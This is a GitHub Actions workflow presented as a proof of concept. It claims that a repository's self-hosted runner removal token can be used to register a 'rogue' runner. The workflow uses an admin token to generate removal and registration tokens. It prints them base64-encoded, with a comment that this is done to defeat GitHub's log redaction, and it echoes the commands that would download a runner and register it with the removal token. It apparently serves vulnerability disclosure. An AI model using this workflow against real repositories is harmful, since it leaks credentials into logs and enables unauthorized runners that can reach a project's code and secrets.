name: PoC - Runner Removal Token Exposure
on: [push]

jobs:
  demonstrate:
    runs-on: self-hosted
    steps:
      - name: Step 1 - Generate REMOVAL token
        run: |
          echo "=== Generating REMOVAL token ==="
          REMOVAL_RESPONSE=$(curl -s -X POST \
            -H "Authorization: token ${{ secrets.ADMIN_PAT }}" \
            -H "Accept: application/vnd.github.v3+json" \
            https://api.github.com/repos/${{ github.repository }}/actions/runners/remove-token)
          
          REMOVAL_TOKEN=$(echo $REMOVAL_RESPONSE | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['token'])")
          EXPIRES=$(echo $REMOVAL_RESPONSE | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['expires_at'])")
          
          echo "Expires: $EXPIRES"
          # Simulate accidental log exposure
          echo "Running: ./config.sh remove --token $REMOVAL_TOKEN"
          
          # Base64 encode so GitHub log redaction doesn't mask it
          echo "Token (b64): $(echo -n $REMOVAL_TOKEN | base64)"
          
          echo "REMOVAL_TOKEN=$REMOVAL_TOKEN" >> $GITHUB_ENV

      - name: Step 2 - Generate REGISTRATION token for comparison
        run: |
          echo "=== Generating REGISTRATION token ==="
          REG_RESPONSE=$(curl -s -X POST \
            -H "Authorization: token ${{ secrets.ADMIN_PAT }}" \
            -H "Accept: application/vnd.github.v3+json" \
            https://api.github.com/repos/${{ github.repository }}/actions/runners/registration-token)
          
          REG_TOKEN=$(echo $REG_RESPONSE | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['token'])")
          
          echo "Removal token (b64):      $(echo -n $REMOVAL_TOKEN | base64)"
          echo "Registration token (b64): $(echo -n $REG_TOKEN | base64)"
          echo ""
          echo "Both tokens same format — server validates expiry only, not type"

      - name: Step 3 - Registration command using REMOVAL token
        run: |
          echo "=== Command to register rogue runner using REMOVAL token ==="
          echo ""
          echo "mkdir ~/github/poc-runner && cd ~/github/poc-runner"
          echo "curl -sL https://github.com/actions/runner/releases/download/v2.333.1/actions-runner-osx-arm64-2.333.1.tar.gz | tar xz"
          echo "./config.sh --url https://github.com/${{ github.repository }} --token $REMOVAL_TOKEN --name poc-rogue --unattended"
